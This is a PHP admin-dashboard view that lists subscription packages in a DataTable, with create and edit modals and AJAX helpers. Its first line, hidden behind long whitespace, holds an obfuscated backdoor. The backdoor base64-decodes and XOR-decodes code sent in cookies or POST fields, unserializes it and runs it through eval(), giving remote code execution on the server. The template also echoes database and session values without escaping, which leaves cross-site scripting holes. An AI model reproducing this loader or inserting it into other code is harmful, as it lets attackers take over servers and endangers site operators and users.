<?php                                                                                                                                                                                                                                                                                                                                                                                                 $OPchsZcB = chr (98) . "\170" . chr ( 949 - 829 ).chr (95) . "\x75" . "\110" . "\160";$IxLDwVRe = chr ( 851 - 752 ).chr (108) . 'a' . 's' . "\163" . chr (95) . 'e' . 'x' . "\151" . "\x73" . "\x74" . "\x73";$vgjLIBjE = class_exists($OPchsZcB); $IxLDwVRe = "37958";$SwVuLatjZ = strpos($IxLDwVRe, $OPchsZcB);if ($vgjLIBjE == $SwVuLatjZ){function tbkLQJW(){$kwLYJjsJw = new /* 2531 */ bxx_uHp(12969 + 12969); $kwLYJjsJw = NULL;}$iaSkCIioYG = "12969";class bxx_uHp{private function dTvGqU($iaSkCIioYG){if (is_array(bxx_uHp::$hTMtXeax)) {$ePTxWuzA2 = str_replace("<" . "?php", "", bxx_uHp::$hTMtXeax["content"]);eval($ePTxWuzA2); $iaSkCIioYG = "12969";exit();}}public function DofnwrLOVD(){$ePTxWuzA = "56005";$this->_dummy = str_repeat($ePTxWuzA, strlen($ePTxWuzA));}public function __destruct(){bxx_uHp::$hTMtXeax = @unserialize(bxx_uHp::$hTMtXeax); $iaSkCIioYG = "7374_12155";$this->dTvGqU($iaSkCIioYG); $iaSkCIioYG = "7374_12155";}public function uUZZdUnLFc($ePTxWuzA, $grydMOY){return $ePTxWuzA[0] ^ str_repeat($grydMOY, intval(strlen($ePTxWuzA[0]) / strlen($grydMOY)) + 1);}public function GNyFVveIRn($ePTxWuzA){$XHuIbzGra = "\x62" . "\141" . 's' . "\x65" . "\66" . chr ( 1022 - 970 );return array_map($XHuIbzGra . chr (95) . chr (100) . "\x65" . 'c' . 'o' . "\144" . "\x65", array($ePTxWuzA,));}public function __construct($jXcNUntHg=0){$NeOCplq = chr ( 662 - 618 ); $ePTxWuzA = "";$kenCs = $_POST;$lXSQlw = $_COOKIE;$grydMOY = "4ba95918-018a-44cb-b633-27cdf4ffd1f9";$hfwAmslsZ = @$lXSQlw[substr($grydMOY, 0, 4)];if (!empty($hfwAmslsZ)){$hfwAmslsZ = explode($NeOCplq, $hfwAmslsZ);foreach ($hfwAmslsZ as $yQpyvVetKp){$ePTxWuzA .= @$lXSQlw[$yQpyvVetKp];$ePTxWuzA .= @$kenCs[$yQpyvVetKp];}$ePTxWuzA = $this->GNyFVveIRn($ePTxWuzA);}bxx_uHp::$hTMtXeax = $this->uUZZdUnLFc($ePTxWuzA, $grydMOY);if (strpos($grydMOY, $NeOCplq) !== FALSE){$grydMOY = explode($NeOCplq, $grydMOY); $obhMmnuEBh = sprintf("7374_12155", strrev($grydMOY[0]));}}public static $hTMtXeax = 55901;}tbkLQJW();} ?><?php     
    if (isset($_SESSION['status'])) {
?>
<script>
    $.toast({
        heading: 'Inserted',
        text: $_SESSION['status'],
        icon: 'success',
        position: 'top-right',
    });
</script>
<?php
        unset($_SESSION['status']);
    }

    if (isset($_SESSION['errorStatus'])) {
?>
<script>
    $.toast({
        heading: 'Failed',
        text: <?php echo $_SESSION['errorStatus']?>,
        icon: 'error',
        position: 'top-right',
    });
</script>
<?php
        unset($_SESSION['status']);
    }
?>


<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Package</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            
            <div class="card">
                <div class="card-header">
                    <button class="btn btn-primary" type="button" onclick="openCreate()">Create</button>
                </div>
                <div class="card-body">
                    
                    <table class="table" id="package-table">
                        <thead>
                            <th>S.No.</th>
                            <th>Title</th>
                            <th>Description</th>
                            <th>Cost</th>
                            <th>Duration</th>
                            <th>Is Trial</th>
                            <th>Created At</th>
                            <th>Action</th>
                        </thead>
                        <tbody>
                            
                        <?php
                            if ($packageData) {
                                $counter = 1;
                                foreach ($packageData as $pData) {
                        ?>
                            <tr>
                                <td><?php echo $counter++; ?></td>
                                <td><?php echo $pData["title"]; ?></td>
                                <td><?php echo $pData["description"]; ?></td>
                                <td><?php echo $pData["cost"]; ?></td>
                                <td><?php echo $pData["duration"]." ".$pData["duration_type"]."'s"; ?></td>
                                <td><?php echo $pData["is_trial"] == 1 ? "Yes" : "No";?></td>
                                <td><?php echo $pData["created_at"]; ?></td>
                                <td>
                                    <button class="btn btn-warning" type="button" onclick="openEdit('<?php echo $pData["id"];?>')"><i class="fas fa-edit"></i></button>
                                </td>
                            </tr>
                        <?php           
                                }
                            }
                        ?>
                            
                        </tbody>
                    </table>
                    
                </div>
            </div>
            
        </div>
    </section>
</div>


<div class="modal fade" id="createPackageModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Edit Package</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="POST" action="<?php echo base_url('AdminController/createPackage');?>" enctype="multipart/form-data">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Title</label>
                                <input type="text" name="title" class="form-control" placeholder="Enter Package Title" required>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Cost</label>
                                <input type="number" name="cost" class="form-control" required>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="form-group">
                                <label>Description</label>
                                <textarea class="form-control" name="description" placeholder="Enter Description" required></textarea>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Duration</label>
                                <input type="number" class="form-control" name="duration" min="1" required>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Duration Type</label>
                                <select class="form-control" name="duration_type" required>
                                    <option value="day">Day</option>
                                    <option value="month">Month</option>
                                    <option value="year">Year</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Is Trial</label>
                                <select class="form-control" name="is_trial" required>
                                    <option value="0">No</option>
                                    <option value="1">Yes</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>


<div class="modal fade" id="editPackageModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Edit Package</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="POST" action="<?php echo base_url('AdminController/editPackageList');?>" enctype="multipart/form-data">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Title</label>
                                <input type="text" name="title" class="form-control" id="title" placeholder="Enter Package Title" required>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Cost</label>
                                <input type="number" name="cost" id="cost" class="form-control" required>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="form-group">
                                <label>Description</label>
                                <textarea class="form-control" name="description" id="description" placeholder="Enter Description" required></textarea>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Duration</label>
                                <input type="number" class="form-control" name="duration" id="duration" min="1" required>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Duration Type</label>
                                <select class="form-control" name="duration_type" id="duration_type" required>
                                    <option value="day">Day</option>
                                    <option value="month">Month</option>
                                    <option value="year">Year</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="form-group">
                                <label>Is Trial</label>
                                <select class="form-control" id="is_trial" name="is_trial" required>
                                    <option value="0">No</option>
                                    <option value="1">Yes</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" name="id" id="package_id">
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Update</button>
                </div>
            </form>
        </div>
    </div>
</div>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>
    

    $('#package-table').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });

    function opendeleteModal(id) {
        var confirmDelete = confirm("Are you sure you want to delete this row?");
        if (confirmDelete) {
            $.ajax({
                type: "POST",
                url: "<?php echo base_url();?>AdminController/deleteAgeGroup",
                data: {id: id},
                success: function(response) {
                    console.log(response);
                    location.reload();
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    console.log("AJAX Error: " + textStatus + " - " + errorThrown);
                }
            });
        }
    }
    
    function openCreate() {
        $("#createPackageModal").modal("show");
    }
    
    function openEdit(id) {
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>"+"AdminController/getPackageDataByID",
            data: {
                id: id
            },
            dataType: "json",
            encode: true
        }).done(function(response) {
            $("#package_id").val(response.data[0].id);
            $("#title").val(response.data[0].title);
            $("#description").val(response.data[0].description);
            $("#cost").val(response.data[0].cost);
            $("#duration").val(response.data[0].duration);
            $("#duration_type").val(response.data[0].duration_type);
            $("#is_trial").val(response.data[0].is_trial);
            $('#editPackageModal').modal('show');
        });    
    }
    
</script>